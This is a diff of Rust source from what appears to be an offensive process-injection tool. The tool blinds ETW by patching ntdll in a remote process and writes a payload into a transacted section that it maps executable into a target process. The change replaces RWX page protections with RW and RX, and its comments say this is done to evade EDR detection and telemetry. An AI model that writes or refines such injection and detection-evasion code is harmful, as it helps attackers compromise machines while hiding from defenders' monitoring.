@@ -98,9 +98,8 @@ const PAGE_READWRITE: u64 = 0x04;
 /// PAGE_EXECUTE_READ.
 const PAGE_EXECUTE_READ: u64 = 0x20;
 
-/// PAGE_EXECUTE_READWRITE.
-const PAGE_EXECUTE_READWRITE: u64 = 0x40;
-
+/// PAGE_EXECUTE_READ (0x20) and PAGE_READWRITE (0x04) are used instead of
+/// PAGE_EXECUTE_READWRITE to avoid creating RWX pages that are top EDR IoCs.
 /// NtCurrentProcess() pseudo-handle.
 const CURRENT_PROCESS: u64 = (-1isize) as u64;
 
@@ -707,7 +706,9 @@ unsafe fn patch_remote_etw(
 
     // Make ntdll .text page writable so we can patch it.
     // Without this, NtWriteVirtualMemory fails with STATUS_ACCESS_DENIED on
-    // PAGE_EXECUTE_READ memory.
+    // PAGE_EXECUTE_READ memory.  Using PAGE_READWRITE (not RWX) — an RWX page
+    // in ntdll is a top IoC for EDR products; RW is sufficient for the 1-byte
+    // write and avoids the telemetry footprint.
     let mut protect_base: usize = etw_write_addr;
     let mut protect_size: usize = 1;
     let mut old_protect: u32 = 0;
@@ -716,13 +717,13 @@ unsafe fn patch_remote_etw(
         process_handle as u64,
         &mut protect_base as *mut _ as u64,
         &mut protect_size as *mut _ as u64,
-        PAGE_EXECUTE_READWRITE,
+        PAGE_READWRITE,
         &mut old_protect as *mut _ as u64,
     );
 
     if protect_status.is_err() || protect_status.unwrap() < 0 {
         return Err(format!(
-            "NtProtectVirtualMemory(RWX) for ETW patch failed: status={:?}",
+            "NtProtectVirtualMemory(RW) for ETW patch failed: status={:?}",
             protect_status
         ));
     }
@@ -775,6 +776,8 @@ unsafe fn restore_remote_etw(ctx: &EtwBlindingContext) -> Result<(), String> {
     }
 
     // Make ntdll .text page writable so we can restore the original byte.
+    // PAGE_READWRITE is sufficient for the 1-byte write and avoids creating
+    // an RWX page in ntdll (top EDR IoC).
     let mut protect_base: usize = ctx.etw_write_addr;
     let mut protect_size: usize = 1;
     let mut old_protect: u32 = 0;
@@ -783,13 +786,13 @@ unsafe fn restore_remote_etw(ctx: &EtwBlindingContext) -> Result<(), String> {
         ctx.process_handle as u64,
         &mut protect_base as *mut _ as u64,
         &mut protect_size as *mut _ as u64,
-        PAGE_EXECUTE_READWRITE,
+        PAGE_READWRITE,
         &mut old_protect as *mut _ as u64,
     );
 
     if protect_status.is_err() || protect_status.unwrap() < 0 {
         return Err(format!(
-            "NtProtectVirtualMemory(RWX) for ETW restore failed: status={:?}",
+            "NtProtectVirtualMemory(RW) for ETW restore failed: status={:?}",
             protect_status
         ));
     }
@@ -1331,13 +1334,18 @@ unsafe fn create_transacted_section(
     let mut large_size: i64 = aligned_size as i64;
     let mut h_section: usize = 0;
 
+    // SectionPageProtection = PAGE_READWRITE.  The payload is written via a
+    // local RW mapping (write_payload_to_section), then mapped into the target
+    // as PAGE_EXECUTE_READ (map_section_to_target).  Using RWX here would
+    // create an RWX section object that is visible to EDR even if the target
+    // mapping is RX.
     let create_section_status = syscall!(
         "NtCreateSection",
         &mut h_section as *mut _ as u64,               // SectionHandle
         SECTION_ALL_ACCESS,                             // DesiredAccess
         0u64,                                           // ObjectAttributes = NULL
         &mut large_size as *mut _ as u64,               // MaximumSize
-        PAGE_EXECUTE_READWRITE,                         // SectionPageProtection
+        PAGE_READWRITE,                                 // SectionPageProtection
         SEC_COMMIT,                                     // AllocationAttributes
         file_handle as u64,                             // FileHandle (transacted file)
     );
